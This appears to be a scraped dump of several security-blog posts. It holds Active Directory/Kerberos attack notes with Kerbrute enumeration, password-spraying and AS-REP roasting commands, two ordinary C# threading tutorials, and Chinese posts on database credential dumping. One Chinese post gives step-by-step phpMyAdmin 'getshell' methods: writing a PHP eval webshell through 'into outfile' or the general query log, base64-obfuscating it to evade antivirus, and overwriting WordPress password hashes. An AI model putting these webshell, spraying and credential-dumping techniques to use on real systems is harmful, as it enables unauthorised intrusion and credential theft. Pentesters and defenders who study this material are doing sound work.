Ticker ST : Service Ticket TGT : Ticking Gainting Ticket TGT is required to obtain ST. Port 88: Authentication. Port 464: Password reset. AS_REQ &amp; AS_REP and TGS_REQ &amp; TGS_REP.S4U: Using for delegation S4u2Self, S4u2Proxy. PAC Source: https://www.tarlogic.com/blog/how-kerberos-works/ PAC (Privilege Attribute Certificate)1234567891011121314151617typedef unsigned long ULONG;typedef unsigned short USHORT;typedef unsigned long64 ULONG64;typedef unsigned char UCHAR;typedef struct _PACTYPE &#123; ULONG cBuffers; ULONG Version; PAC_INFO_BUFFER Buffers[1]; &#125; PACTYPE;typedef struct _PAC_INFO_BUFER &#123; ULONG ulType; ULONG cbBufferSize; ULONG64 Offset;&#125; PAC_INFO_BUFFER; PAC_VALIDATION_INFO12345678910111213141516171819202122232425262728293031323334353637typedef struct _KERB_VALIDATION_INFO &#123; FILETIME LogonTime; FILETIME LogoffTime; FILETIME KickOffTime; FILETIME PasswordLastSet; FILETIME PasswordCanChange; FILETIME PasswordMustChange; RPC_UNICODE_STRING EffectiveName; RPC_UNICODE_STRING FullName; RPC_UNICODE_STRING LogonScript; RPC_UNICODE_STRING ProfilePath; RPC_UNICODE_STRING HomeDirectory; RPC_UNICODE_STRING HomeDirectoryDrive; USHORT LogonCount; USHORT BadPasswordCount; ULONG UserId; ULONG PrimaryGroupId; ULONG GroupCount; [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds; ULONG UserFlags; USER_SESSION_KEY UserSessionKey; RPC_UNICODE_STRING LogonServer; RPC_UNICODE_STRING LogonDomainName; PISID LogonDomainId; ULONG Reserved1[2]; ULONG UserAccountControl; ULONG SubAuthStatus; FILETIME LastSuccessfulILogon; FILETIME LastFailedILogon; ULONG FailedILogonCount; ULONG Reserved3; ULONG SidCount; [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids; PISID ResourceGroupDomainSid; ULONG ResourceGroupCount; [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;&#125; KERB_VALIDATION_INFO; AS-REQ &amp; AS-REPTGT is generated by KDC’s AS(Authentication Service). The AS-REQ represnets the initial message clients send to the KDC when requesting authentication. This message contains the username. The AS-REP message contains the requested TGT encrypted with a key derived form the user’s password hash. Under normal circumstances, this message is only sent after successful pre-authentication validation. TGS-REQ &amp; TGS-REPAP-REQ &amp; AP-REP Bidirectional AuthenticationAP: Application Protocol Security Issues of Kerberos Protocol PTH: Attacker may performs PTH if the attacker obtained the hash of user’s password. PTK: Attacker may performs PTK if the attacker obtained the AES key of user’s password. Domain Account Enumeration Password Spraying: Fixed password, different username. Golden Ticket Attack: Kerberos authentication relies on a KDC(Key Distribution Center), which issues TGTs(Ticket Granting Tickets) for user authentication. Attackers abuses this process by forging valid Kerberos tickets. Silver Ticket Attack: To execute a silver ticket attack, an attacker must already have local administrator access on a compromised machine and obtain the NTLM hash of the targeted service account. Unlike a golden ticket attack, which grants full domain control, a silver ticket attack is more targeted, allowing adversaries to abuse a specific service account while bypassing certain security controls. AS-REP Roasting: It is a Kerberos-based credential harvesting technique that targets accounts configured without Kerberos preauthentication. An attacker can request an AS-REP for such an account, receive data encrypted with the account’s long-term key, and crack that encrypted blob offline to recover the plaintext password 1.3 - LDAPLDAP(Lightweight Directory Access Protocol) is a open, vendor-neutral protocol for accessing and managing distributed directory information service. Think of X.500 as the foundational standard for a vast, hierarchical phone book. Fundamentals Fundamental Model Information Model: Defines how data is structed and stored. Naming Model: Defines how entries are named and organized. DN(Distinguished Name), RDN(Relative Distinguished Name). 1cn=John Doe,ou=Users,dc=example,dc=com Functional Model: Defines what operations LDAP can perform. Security Model: Defines how LDAP is protected. Application Factors Unique: Every LDAP entry has a unique Distinguished Name(DN). Inherit Characteristics: LDAP entries inherit characteritics from object classes. Replication: Directory data can be copied across multiple LDAP servers. Cross-Platform: LDAP is an open standard(RFC-based). Tree Hierarchy Global CatalogA Global Catalog is a special domain controller that stores: A full copy of all objects in its own domain. A partial copy of objects from all other domains in the forest. Generally, the first domain controller (DC) in a new forest is configured as a Global Catalog (GC).A Global Catalog stores a partial replica of all domains in the forest.The GC listens on port 3268 for LDAP and 3269 for LDAP over SSL. Chapter.2 - Domain Fundamentals2.1 - Common Terminologies stores information about network objects such as user accounts, computer accounts, and groups. Clients use LDAP to query and manage directory information in Active Directory, while Kerberos is used for authentication. ADDS: Active Directory Domain Service LDAP: Lightweight Directory DC: Domain Controller X.500 Standard DC: Domain Component(NOT Domain Controller), the concept is similar to DNS(Domain Name Resolution). For example: foo.com OU: Organization Unit CN: Common Name DN: Distinguished Name RDN: Relative Distinguished Name UPN: User Principle Name Container: FQDN: Fully Qualified Domain Name 2.2 - Workgroup And DomainWorkgroupDomain Types of Domain Single Domain Domain Tree Domain Forest Characteristics of Domain Domain Functionality Level and Forest Functionality Level Domain Functionality Level Forest Functionality Level 2.3 - Domain TrustDomain Trust enables resource sharing between multiple domains. Such access is available only when a trusted relationship exists. Domain Trust relies on the Kerberos Protocol for cross-domain authentication. Trust Types One-Way Trust:In a one-way trust, domain A trusts domain B. This means users from domain B can access resources in domain A, but users from domain A cannot access resources in domain B. In other words, “I trust you, but you don’t trust me.” Two-Way Trust:Domain A trusts domain B and domain B trusts domain A. Since Windows Server 2003, two-way trust has been the default configuration for domains within the same forest. When a domain is added to a domain tree, a two-way transitivee trust is automatically established. Shortcut Trust:A shortcut trust is a manually created two-way trust between two domains, typically used to improve authentication performance by shorten the trust path. It DOES NOT OCCUR AUTOMATICALLY and is commonly used in complex or large AD environments. Interal Trust, External Trust And Forest TrustCross-Domain Access2.4 - Configuration And Setting A Domain2.5 - Local Account and AD AccountLocal AccountThe local accounts can only access resources on the local system and are ioslated to a single machine. The default local accounts are built-in accounts(e,g,m Administrator, Guest). They are created during Windows installation and cannot be deleted. Administrator:The Administrator account is created during Windows installation and has full control over the system. It cannot be deleted, but it can be renamed or disable. For security reasons, this account is disabled by default in recent versions of Windows. Instead, Windows provideds the Administrators group for privilege management.To enable the Administrator account:1net user Administrator /active:yes Guest:The Guest account has a well-known RID of 501 (SID formatL S-1-5-21-XX-501). It is disabled by default.This account allows users to log in with very limited privileges and is the only member of the Guests group.1net localgroup Guests DefaultAccount:The DefaultAccount is also known as DSMA(Default System Managed Account). It is a built-in account introduced in Windows 10 version 1607 and Windows Server. It is used to run multi-user aware applications(MUMA apps), such as Xbox Shell.It is disabled by default on desktop Windows and Windows Server 2016. The account has a well-known RID of 503, and its SID format is S-1-5-21-XX-503.DSMA is a member of the System Managed Accounts Group, which has the SID S-1-5-32-581.12&gt; net localgroup &quot;System Managed Accounts Group&quot;&gt; wmic group get name,sid | findstr &quot;System Managed Accounts Group&quot; WDAGUtilityAccount:The WDAGUtilityAccount is an account used by Windows Defender Application Guard, introduced in Windows 10 version 1709 and Windows Server 2016.The account has a well-known RID of 504. AD AccountAn AD account (Active Directory account) refers to a security principal stored in Active Directory. In Active Directory, accounts are mainly represented by different object types, such as User accounts and Computer accounts.A Service Account is not a distinct account type in AD; it is usually implemented as a User account that is used to run services. An SPN (Service Principal Name) is a Kerberos identifier for a service instance.The presence of an SPN does not strictly indicate a service account, as SPNs can also be assigned to computer accounts. To identify a computer account, properties such as objectClass or a sAMAccountName ending with $ are commonly used. User AccountUser Account represents a physical entity, such as a person. Local Account on DC(Domain Controller): Administrator: Guest: krbtgt: User account’s properties: | Property | Meaning || —- | —- || sn | Surname || giveName | Name || initials | English || displayName, cn and name | Name || co | Country, region || postalCode | Postal code || st | State || l | City || streetAddress | Street address || postOfficeBox | Post office box || badPasswordTime | Date time of last log in failed. | User account’s options: Service AccountA service account is a special user account. Computer AccountA computer account is also a special user account, but users cannot log in. Create a computer account: Python PowerShell Computer Account’s Proprities: Computer Account and system Account 2.6 - Local Group and Domain GroupLocal Group12&gt; net localgroup&gt; wmic group get name,sid Administrators Users Guests Backup Operators Remote Desktop Users Power Users Network COnfiguration Operators:Members of this group are able to configurate settings of TCP/IP, update and offer TCP/IP addresses. Domain Group Types of Domain Group Securiy Group Distribution Group Scope of Domain Groups | Type | Members | Scope Conversion | Privilege Providence || —- | —- | —- | —- || Universal Group || Global Group || Domain Local Group | Domain Local Group Global Group Universal Group Built-In Groups of AD Built-in domain local group Built-in global group Built-in universal group 2.7 - Directory PartitionEvery Domain Controller (DC) running Active Directory Domain Services (AD DS) hosts replicas of one or more directory partitions. A directory partition is also known as a Naming Context (NC). In a typical Active Directory forest, the following directory partitions exist. Domain Directory Partition——contains domain-specific objects such as users, groups, and computers. Configuration Directory Partition——stores forest-wide configuration data, including sites and replication topology. Schema Directory Partiton——defines all object classes and attributes used in Active Directory. Application Directory Partiton——an optional partition used to store application-specific data and replicate it to selected DCs. Domain Directory PartitionConfiguration Directory PartitionSchema Directory PartitionApplication Directory Partition2.8 - SPN2.9 - Group Policy of A DomainSecurity Issues of Group Policy2.10 - ACL Security Principals:Security Principal is any entity that can be authenticated(e.g, user’s account, computer’s account, or threads which are running in Security Context) Security Identifiers (SID):SID is a distinguished identifier of a Security Principal or Security Group Chapter.3 - Domain’s Tools3.1 - BloodHoundBloodHound is based on Linkerious. We use SharpHound to obtain information: https://github.com/BloodHoundAD/SharpHound3https://github.com/SpecterOps/SharpHound 1&gt; SharpHound3.exe -c all We then import the *.zip from last step into BloodHound. 3.2 - AdfindAdfind is a C++ based AD searching tool. https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools 1&gt; Adfind.exe /? 1&gt; Adfind.exe [switches] [-b basedn] [-f filter] [attr list] 1&gt; Adfind.exe -f objectclass=trusteddomain -dn Querying DC12345# Query name of DC (Domain Controller)&gt; Adfind.exe -sc dclist # Query version of DC (Domain Controller)&gt; Adfind.exe -schema -s base objectversion Querying Computer12345# Query all computers, display DN only.&gt; Adfind.exe -f &quot;objectcategory=computer&quot; dn# Query all computers, display name and operating system.&gt; Adfind.exe -f &quot;objectcategory=computer&quot; name operatingSystem 12345# Query active computer, display DN only.&gt; Adfind.exe -sc computers_active dn# Query active computer, display name and OS.&gt; Adfind.exe -sc computers_active name operatingSystem 12# Query specified computer&#x27;s mail.&gt; Adfind.exe -f &quot;&amp;(objectcategory=computer)(name=mail)&quot; Querying UsersQuerying GroupsQuerying Delegation3.2 - Admod https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools Admod is a C++ based tool, used for AD modification. 3.4 - LDPLDP is a Microsoft built-in tool, used for AD information querying. This tool is similar to ADExplorer, both of them are LDAP querying tool. 3.5 - LdapsearchThis is a tool on Unix-like platform. It is a built-in tool of Kali Linux. 1&gt; Ldapsearch -h Parameter Description -H LDAP URI -h IP or resolvalbe hostname of LDAP server, cannot be used with -H -p -x -D -w -W Usage Connection 1Ldapsearch -H ldap://x.x.x.x:389 -D &quot;hack@apt.com&quot; -w P@ss1234 1Ldapsearch -h x.x.x.x -p 389 -D &quot;hack@apt.com&quot; -w P@ss1234 Important: -H ≠ -h Filtering1 Display1 3.6 - PingCastlePingCastle is a tool built by CERT of ENGINE on France. It is a free, open-source tool and methodology for assessing AD security. healthcheck conso carto scanner export advanced 3.7 - KekeoKekeo is a tool for exploiting Kerberos. It is written by Benjamin, the author of mimikatz https://github.com/gentilkiwi/kekeo This tool has the following modules: standard(coffee…?) others(Significant parts!) 3.8 - RubeusRubeus is a C# based tool. It is used for exploiting Kerberos Protocol. https://github.com/GhostPack/Rubeus 3.9 - mimikatzmimikatz is a powerful tool used for Windows security. https://github.com/gentilkiwi/mimikatz 3.10 - Impacket https://github.com/fortra/impacket/tree/master/examples Chapter.4 - Penetration Methods In Domain4.1 - Domain Account EnumerationDuring the AS-REQ stage of Kerberos authentication, the cname (client principal name) field in the request corresponds to the user principal being authenticated. The KDC responds differently depending on the state of the account, such as whether the user exists, is enabled, or does not exist.These differences can be observed through distinct Kerberos responses or error codes. As a result, it is possible to enumerate domain user accounts by analyzing the KDC responses to AS-REQ messages. Users’ State AS-REP information User exists and is enabled KDC_ERR_PREAUTH_REQUIRED User exists and is disabled KDC_ERR_CLIENT_REVOKED NT Status: STATUS_ACCOUNT_DISABLED (Unavailable) User does not exist KDC_ERR_C_PRINCIPAL_UNKNOWN Kerbrute1&gt; kerbrute_windows_amd64.exe userenum --dc x.x.x.x -d apt.com user.txt pyKerbrute12345# TCP mode&gt; python EnumADUser.py x.x.x.x apt.com user.txt tcp# UDP mode&gt; python EnumADUser.py x.x.x.x apt.com user.txt udp 4.2 - Password SprayingPassword spraying is usually performed after domain account enumeration. During the AS-REQ stage of Kerberos authentication, the cname (client principal name) field corresponds to the target username.This behavior allows attackers to enumerate valid domain accounts. Password spraying involves testing a single common password against multiple usernames, rather than multiple passwords against a single account.The goal of this technique is to reduce the likelihood of account lockouts enforced by domain lockout policies. Kerbrute1&gt; kerbrute_windows_amd64.exe passwordspray --dc x.x.x.x -d apt.com user.txt P@ssword pyKerbrute1234567# Plain text password&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt clearpassword P@ssword tcp&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt clearpassword P@ssword udp# Hashed password&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt ntlmhash &lt;Your NTLM Hash&gt; tcp&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt ntlmhash &lt;Your NTLM Hash&gt; udp 4.3 - AS-REP RoastingAS-REP Roasting is an offline password cracking technique targeting user accounts. This method is limited because it requires Kerberos pre-authentication to be disabled. Extract AS-REP Hashes: Rubeus:If the compromised host is domain-joined: 1&gt; Rubeus.exe asreproast /format:john /outfile:hash.txt ASREPRoast.ps1:If the compromised host is not domain-joined, AS-REP Roasting cannot be performed directly and requires alternative enumeration methods: 1PS&gt; Import-Module .\\ASREPRoast.ps1 Invoke-ASREPRoast | select -ExpandProperty Hash Computer is not in a domain Hash Cracking:John: 1&gt; john --wordlist=/opt/pass.txt hash.txt hashcat: 1hashcat -m 18200 hash.txt pass.txt --force 4.4 - KerberoastingKerberoasting happens at the TGS-REP stage of Kerberos authentication. TGS service of KDC responses a hashed ST to user’s of the client. The attacker might performs offline cracking after the ST was received. The nutshell of Kerberoasting is: RC4_HMAC_MD5 is used during Negotiation stage. SPN Discovery RiskySPN GetUserSPNs 4.5 - DelegationTypes of Delegation UD (Unconstrained Delegation) CD (Constrained Delegation) RBCD (Resource Based Constrained Delegation) Unconstrained Delegation Constrained Delegation Resource Based COnstrained Delegation 4.6 - Kerberos Bronze Bit4.7 - NTLM Relay4.8 - Abusing DCSync4.9 - PTH4.10 - Locating Logged In Computer4.11 - Domain Forest PenetrationChapter.5 - Domain Exploitation5.1 - MS14-0685.2 - CVE-2019-1040 NTLM MIC5.3 - CVE-2020-1472 NetLogon Privilege Escalation5.4 - Windows Print Spooler Privilege Escalation5.5 - ADCS Exploitation5.6 - CVE-2021-42287 Privilege Escalation5.7 - Exchange ProxyLogon Exploitation5.8 - Exchange ProxyShell Kill ChainChapter.6 - Persistence And Post-Exploitation Password ExtractionTHANKS FOR READING!","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Blackhat","slug":"Blackhat","permalink":"https://iss4cf0ng.github.io/tags/Blackhat/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"LAN","slug":"LAN","permalink":"https://iss4cf0ng.github.io/tags/LAN/"},{"name":"Domain","slug":"Domain","permalink":"https://iss4cf0ng.github.io/tags/Domain/"},{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"Pentest","slug":"Pentest","permalink":"https://iss4cf0ng.github.io/tags/Pentest/"},{"name":"PrivilegeEscalation","slug":"PrivilegeEscalation","permalink":"https://iss4cf0ng.github.io/tags/PrivilegeEscalation/"},{"name":"Privilege","slug":"Privilege","permalink":"https://iss4cf0ng.github.io/tags/Privilege/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Code] C# - Simple way to pass parameters to Thread() method and invoke control","slug":"CSharp-ThreadWithParameters","date":"2024-12-03T16:15:38.000Z","updated":"2025-12-31T13:42:17.897Z","comments":true,"path":"2024/12/04/CSharp-ThreadWithParameters/","link":"","permalink":"https://iss4cf0ng.github.io/2024/12/04/CSharp-ThreadWithParameters/","excerpt":"","text":"AbstractToday, I’ll share a straightforward approach to passing parameters to the Thread method in C#. I’ll also cover how to invoke a control safely within a thread. The Common Approach You See OnlineThis is what I saw in online:123456789101112131415161718192021222324void Function1(object data)&#123; //SOME CODE...&#125;void Function2(object data)&#123; object[] objs = (object[])data; //Convert object into object array. int x = (int)objs[0]; //Convert 1st element into integer. string y = (string)objs[1]; //Convert 2nd element into integer. //SOME CODE.....&#125;//Function 1object obj = &quot;Hello world!&quot;;Thread thread1 = new Thread(new ParameterizedThreadStart(Function1));thread1.Start(obj);//Function 2object[] objs = new object[] &#123; 666, &quot;What?&quot; &#125;;Thread thread1 = new Thread(new ParameterizedThreadStart(Function2));thread1.Start(objs);This method works but feels clunky and error-prone. It involves boxing/unboxing and manually unpacking parameters, which isn’t ideal. A Simpler Way to Pass ParametersWe can use the lamda function12345678void Function(int x, string y)&#123; //SOME CODE.....&#125;Thread thread = new Thread(() =&gt; Function(666, &quot;Good&quot;));thread.Start();With this approach, the Thread constructor doesn’t need a separate method like ParameterizedThreadStart. Instead, the lambda expression lets you pass the exact arguments to your method. Going Even FurtherIf you don’t need to reuse the thread reference, you can make it even cleaner123456void Function(int x, string y)&#123; //SOME CODE.....&#125;new Thread(() =&gt; Function(666, &quot;Nice&quot;)).Start(); This method eliminates the need for intermediate objects entirely. It’s cleaner, concise, and less error-prone. AdditionMore elegant ways1234567void Function(int x, string y)&#123; // SOME CODE...&#125;Task.Run(() =&gt; Function(666, &quot;Oh...&quot;));This is concise, highly readable, and works seamlessly with async/await patterns. 123456void Function(int x, string y)&#123; // SOME CODE...&#125;ThreadPool.QueueUserWorkItem(_ =&gt; Function(666, &quot;ThreadPool&quot;)); Thread pooling is efficient and avoids the overhead of creating a dedicated thread for every task!","categories":[],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"}],"keywords":[]},{"title":"【Code】C# 元件Invoke的方法","slug":"【Code】CSharpInvokeMethod","date":"2023-06-14T07:57:57.000Z","updated":"2023-06-17T02:26:08.795Z","comments":true,"path":"2023/06/14/【Code】CSharpInvokeMethod/","link":"","permalink":"https://iss4cf0ng.github.io/2023/06/14/%E3%80%90Code%E3%80%91CSharpInvokeMethod/","excerpt":"","text":"前言記錄一下C#中可以在Thread中存取Controls的方法 C# 元件執行程式C# WindowsForm中我們可以把要執行的程式寫在元件的事件(Event)中，例如button1按下後可以彈出MessageBox的程式為12345private void button1_Click(object sender, EventArgs e)&#123; MessageBox.Show(&quot;Hello world&quot;); //MessageBox.Show(&quot;Hello world&quot;,&quot;Here is the test&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);&#125; 如果我們要把Hello world顯示在TextBox1上，那程式就會是1234private void button1_Click(object sender, EventArgs e)&#123; textBox1.Text = &quot;Hello world&quot;;&#125; 需要時間的程式現在考慮一個ConsoleApplication要把數字 i = 0 ~ 9999一行一行地顯示在Console上，這很簡單 :1234for (int i = 0; i &lt; 10000; i++)&#123; Console.WriteLine(i);&#125; 可是如果在WindowsForm中要把 i = 0 ~ 9999一行一行地顯示在textBox1上呢 ?12345for (int i = 0 ; i &lt; 10000; i++)&#123; textBox1.AppendText(i.ToString()); textBox1.AppendText(Environment.NewLine);&#125;然後把這程式放到Button1內 :12345678private void button1_Click(object sender, EventArgs e)&#123; for (int i = 0 ; i &lt; 10000; i++) &#123; textBox1.AppendText(i.ToString()); textBox1.AppendText(Environment.NewLine); &#125;&#125;好像很簡單對吧 ? 但事實不是這樣，當你執行後你會發現你的WindowsForm根本動不了，過了一段時間後WindowsForm可以動，然後數字 0 ~ 9999會突然出現在textBox1上，可是現在我想要的結果是數字會像在ConsoleApplication上一行一行地顯示在TextBox上，而不是這樣突然出現，何況程式還會突然卡死。 原因UI Thread (Main Thread)WindowsForm在不使用其他Thread的時候在程式打開(打開.exe檔)的一刻到程式關掉時，所有事都會發生在UI Thread上，例如for loop，Thread.Sleep()，Button按鍵等等，甚至包括WindowsForm本身的上下左右移動，也就是說當你按下button1時，程式就會進入for loop，而此時for loop就是發生在UI Thread上，直到for loop結束，UI Thread才會從for loop跑出來，可是在for loop結束之前，你的for loop都無法跑出來，也就不能對WindowsForm進行住何操作，而數字顯示在textBox1上這件事也是發生在UI Thread上，但此時UI Thread還在for loop當中，所以這就是為甚麼你的程式不能移動，也不會馬上顯示數字。 解決方法Thread這邊我們會想到可以建立一個新的Thread，用這個Thread去執行for loop，具體方法如下 :12345678910111213void RunLoop()&#123; for (int i = 0 ; i &lt; 10000; i++) &#123; textBox1.AppendText(i.ToString()); textBox1.AppendText(Environment.NewLine); &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123; new Thread(RunLoop).Start();&#125;看上去合理的程式，執行看看，又出現問題了，IDE會直接跟你說跨執行緒作業無效。 原因新的Thread不能直接存取另外一個Thread，需要再加上一些東西，可以使用delegate或MethodInvoke的方法解決，這邊我提供一個我自己常用的方法，就是直接對元件Invoke 對元件直接Invoke12345678910111213141516171819void RunLoop()&#123; for (int i = 0 ; i &lt; 10000; i++) &#123; textBox1.Invoke(new Action(() =&gt; &#123; textBox1.AppendText(i.ToString()); textBox1.AppendText(Environment.NewLine); &#125;)); //或者以下寫法 //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString()))); //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine))); &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123; new Thread(RunLoop).Start();&#125; 如此一來，數字就可以一行一行顯示 傳參數一個參數現在讓for loop的最大數字可控 :1234567891011121314151617181920void RunLoop(object o)&#123; for (int i = 0 ; i &lt; (int)o; i++) &#123; textBox1.Invoke(new Action(() =&gt; &#123; textBox1.AppendText(i.ToString()); textBox1.AppendText(Environment.NewLine); &#125;)); //或者以下寫法 //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString()))); //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine))); &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123; object o = 10; new Thread(RunLoop).Start();&#125; 多個參數現在讓for loop的最大數字可控且在指定TextBox顯示 :12345678910111213141516171819202122232425262728void RunLoop(object o)&#123; object[] obj_array = (object[])o; int max = (int)obj_array[0]; TextBox textbox = (TextBox)obj_array[1]; //TextBox textbox = obj_array[1] as TextBox; for (int i = 0 ; i &lt; (int)o; i++) &#123; textbox.Invoke(new Action(() =&gt; &#123; textbox.AppendText(i.ToString()); textbox.AppendText(Environment.NewLine); &#125;)); //或者以下寫法 //textbox.Invoke(new Action(() =&gt; textbox.AppendText(i.ToString()))); //textbox.Invoke(new Action(() =&gt; textbox.AppendText(Environment.NewLine))); &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123; int max = 100; new Thread(new ParameterizedThreadStart(RunLoop)).Start(new object[] &#123; max, textBox1 &#125;);&#125;","categories":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}]},{"title":"【Tech】[PenTest] phpMyAdmin的getshell方法","slug":"【Tech】-PenTest-phpmyadmingetshell","date":"2023-06-12T08:03:06.000Z","updated":"2026-02-23T08:44:16.422Z","comments":true,"path":"2023/06/12/【Tech】-PenTest-phpmyadmingetshell/","link":"","permalink":"https://iss4cf0ng.github.io/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/","excerpt":"","text":"前言在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。 環境 Windows 11 Apache + php8.2 phpMyAdmin 前提需要以下條件 phpMyAdmin最好是root帳號 知道Absolute Path (本文使用 D:/xampp/htdocs) 實戰Geshell方法phpMyAdmin getshell一般有兩種方法 : SQL getshell 後端 getshell 第一種是使用SQL把webshell寫到伺服器上，第二種是改後端密碼上傳webshell。 SQL getshell常用方法 - 使用 select into outfile這應該是最常用的方法了，在知道路徑的情況下可以用這招12select load_file(&#x27;D:/xampp/htdocs&#x27;);select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;D:/xampp/htdocs&#x27;;這是最簡單的方法，也是很容易失敗的方法，大部份網頁admin都不是傻的，他們會有設定檔案權限，此時執行1SHOW VARIABLES LIKE &quot;secure_file_priv&quot;; Value一般會有兩種結果 Folder路徑 : 代表只有該路徑才可以修改 NULL : 禁止修改 Log寫shellMySQL 5.0以上會自動寫Logs，把執行過的SQL指令都寫進一個.log檔，那如果此時的檔案不是.log而是.php呢? 執行以下指令1SHOW VARIABLES LIKE &#x27;general%&#x27;; 12set global general_log = &quot;ON&quot;;set global general_log_file=&quot;D:/xampp/htdocs/shell.php&quot;; 就會在D:/xampp/htdocs 生成一個shell.php然後再1select &#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;&#x27;就可以getshell了 技巧最簡單的php一句話木馬1&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;也是最容易被防毒查出來的，如果webshell的code寫得比較多可以把webshell base64加密，再使用php的 base64_decode(); 函數解密。 注意Log寫webshell的方法動作會很大的，會很容易被發現。另外記得要把一開始的.log檔案記下，不然你會無法還原。 後端GetShell後端登入 以wordpress為列子，phpMyAdmin+wordpress是比較容易getshell的，因為wordpress是基於php的，而後端一般都會有檔案修改和上傳等功能。Wordpress登入後端目前還算是很容易的，兩種做法 : 破解密碼Hash 在無法破解的情況下直接改密碼 WordPress加密後的密碼很上去很亂，但要改也不難，假設你的新密碼是admin，那就把admin以MD5加密，把MD5 Hash換進去就可以了。 GetShell方法一般三種方法 模版上傳 Plugin上傳 直接插入一句話木馬 這種用第三種會比較好，因為前兩種都比較容閉被發現。","categories":[],"tags":[{"name":"pentest","slug":"pentest","permalink":"https://iss4cf0ng.github.io/tags/pentest/"},{"name":"php","slug":"php","permalink":"https://iss4cf0ng.github.io/tags/php/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"https://iss4cf0ng.github.io/tags/phpmyadmin/"},{"name":"getshell","slug":"getshell","permalink":"https://iss4cf0ng.github.io/tags/getshell/"},{"name":"webshell","slug":"webshell","permalink":"https://iss4cf0ng.github.io/tags/webshell/"}],"keywords":[]},{"title":"【Tech】[SQL]SQL注入取得使用者帳號密碼的方法","slug":"【Tech】-SQL-SQL注入取得使用者帳號密碼的方法","date":"2023-06-12T08:00:40.000Z","updated":"2023-06-12T13:14:36.433Z","comments":true,"path":"2023/06/12/【Tech】-SQL-SQL注入取得使用者帳號密碼的方法/","link":"","permalink":"https://iss4cf0ng.github.io/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"前言記錄幾個在sql注入中可以把database user, password拿出來的方法 SQLMap1sqlmap.py -u xxx --passwords SQL Query12345//MySQLselect host,user,password from mysql.user;//SQL Server 2022SELECT name, CONVERT(varchar(max), password_hash, 1) AS hashed_password FROM sys.sql_logins","categories":[],"tags":[],"keywords":[]},{"title":"【Tool】Alien","slug":"【Tool】Alien","date":"2023-06-05T17:33:04.000Z","updated":"2023-06-11T17:04:44.957Z","comments":true,"path":"2023/06/06/【Tool】Alien/","link":"","permalink":"https://iss4cf0ng.github.io/2023/06/06/%E3%80%90Tool%E3%80%91Alien/","excerpt":"","text":"簡介Alien是一個用C#編寫的一句話木馬管理工具，功能如下 : System Information FileManager (可顯示圖片) Virtual Terminal Database Registry Monitor Screenshot 可控伺服器(可使用功能不一致)Windows/Linux/Unix/MacOS Database MySQL : PHP SQL Server : ASP, ASPX, ASMX, ASHX 文檔&amp;下載 ID 主題 Url 1 Alien文檔 https://malbuffer4pt.github.io/Alien 2 Alien Github 